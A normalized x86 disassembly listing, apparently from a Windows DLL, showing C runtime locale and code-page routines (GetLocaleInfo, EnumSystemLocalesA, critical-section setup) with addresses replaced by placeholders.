je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_1001f12f
push edi
call sub_1001750d
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_1001f523
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
push esi
call sub_1001750d
pop ecx
sub_1001f58c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x50
push 0x1
call sub_10019e40
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x18 ] edi
jne r-xdata
mov esi [ esi + 0xbc ]
push 0x14
pop ecx
mov edi ebx
push 0x4
[ edi ] [ esi ]
call sub_10019dfb
xor edi edi
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ eax ] edi
cmp [ esi + 0x1c ] edi
je r-xdata
push ebx
call sub_1001750d
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb4 ]
mov edi [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
mov eax [ rw-data ]
mov [ ebx + 0x4 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x8 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x30 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] edi
mov [ ebx + 0x34 ] eax
push 0x4
call sub_10019dfb
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
test eax eax
je r-xdata
push eax
call edi
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x3e ]
push ebx
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
mov edi eax
lea eax [ ebx + 0x4 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x8 ]
push eax
push 0x10
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x30 ]
push eax
push 0xe
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ ebx + 0x34 ]
push eax
push 0xf
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001e38b
add esp 0x14
or eax edi
je r-xdata
xor esi esi
inc esi
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb4 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push ebx
call sub_1001f523
pop ecx
or esi 0xffffffff
jmp r-xdata
push [ esi + 0xb0 ]
call sub_1001750d
push [ esi + 0xbc ]
call sub_1001750d
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
push ebx
call sub_1001750d
push [ ebp - 0x8 ]
call sub_1001750d
pop ecx
pop ecx
mov eax esi
jmp r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ecx ] eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1001f77c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1001750d
pop ecx
push esi
call sub_1001750d
pop ecx
sub_1001f87a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0xc ] edi
cmp [ esi + 0x18 ] edi
jne r-xdata
push 0x50
push 0x1
call sub_10019e40
mov ebx eax
pop ecx
pop ecx
cmp ebx edi
jne r-xdata
cmp [ esi + 0x1c ] edi
jne r-xdata
push 0x4
call sub_10019dfb
pop ecx
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
mov ebx rw-data
jmp r-xdata
mov [ eax ] edi
cmp [ esi + 0x18 ] edi
je r-xdata
push ebx
call sub_1001750d
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0xb8 ]
cmp eax edi
je r-xdata
push 0x14
pop ecx
mov esi rw-data
mov edi ebx
[ edi ] [ esi ]
push 0x4
call sub_10019dfb
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax edi
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov [ eax ] edi
movzx esi [ esi + 0x38 ]
lea eax [ ebx + 0xc ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
mov edi eax
lea eax [ ebx + 0x10 ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x14 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x18 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ ebx + 0x1c ]
push eax
push 0x18
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x20 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x24 ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x1
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x28 ]
push eax
push 0x1a
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ ebx + 0x29 ]
push eax
push 0x19
push esi
push 0x0
lea eax [ ebp - 0x10 ]
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x2a ]
push eax
push 0x54
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x2b ]
push eax
push 0x55
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x2c ]
push eax
push 0x56
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ ebx + 0x2d ]
push eax
push 0x57
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x2e ]
push eax
push 0x52
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x2f ]
push eax
push 0x53
push esi
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x38 ]
push eax
push 0x15
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001e38b
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001e38b
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1001e38b
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_1001750d
push [ ebp - 0x8 ]
call sub_1001750d
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_1001f77c
push ebx
call sub_1001750d
push [ ebp - 0x8 ]
call sub_1001750d
push [ ebp - 0x4 ]
call sub_1001750d
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_1001750d
push [ esi + 0xb0 ]
call sub_1001750d
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1001fbda
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1001fc92
push 0xc
push r--data
call sub_1001de70
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_1001e71b
push 0x1e
call sub_1001e56c
push 0xff
call sub_1001d525
push 0x18
call sub_10019dfb
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_1001fd54
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_10017e85
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_1001deb5
retn
push edi
call sub_1001750d
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_1001750d
pop ecx
call sub_10017e85
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001fd4b
mov eax [ ebp - 0x1c ]
sub_1001fd54
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1001fc92
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1001d7a2
sub_1001fd87
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
push edi
test ecx ecx
je r-xdata
call sub_10017e85
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi ecx
mov [ ecx ] 0x0
jmp r-xdata
test edi edi
je r-xdata
inc esi
dec edi
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] 0x0
call sub_10017e85
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ edx ]
mov [ esi + edx ] al
inc edx
test al al
je r-xdata
call sub_1001b8e4
mov eax esi
jmp r-xdata
sub_1001fdf4
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_10025100
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_1001fe56
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_1001b620
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_1001b620
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_10025147
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_1001feda
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1001feff
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_1001ff30
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_1001ff4b
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1001c0b4
mov edx edi
mov esi eax
call sub_1001feff
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_10025100
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_1001feda
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10016ec3
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_1001fff2
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_1001ff30
push esi
mov edi eax
call sub_10018330
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_1002004d
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1001c0b4
mov edx edi
lea esi [ eax + 0x9c ]
call sub_1001feff
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_10025100
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10025100
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10025100
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1002523f
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10025100
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_10018330
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_1001feda
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_10018330
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_1001fff2
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1002021e
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1001c0b4
mov edx edi
lea esi [ eax + 0x9c ]
call sub_1001feff
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10025100
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10016ec3
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10025100
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_1001fff2
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_100202de
push [ esi ]
call sub_10018330
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_10018330
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_1001ff30
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_1002004d
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_10020345
push [ esi ]
call sub_10018330
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_1001ff30
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_1002021e
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_10020381
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1001c0b4
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_1001fdf4
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_1001fe56
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_10018330
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_1001ff4b
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_10020345
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_1001fdf4
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_100202de
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_10020345
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_100202de
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_1001b438
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1001b892
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_10019cc6
add esp 0x10
sub_10020572
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
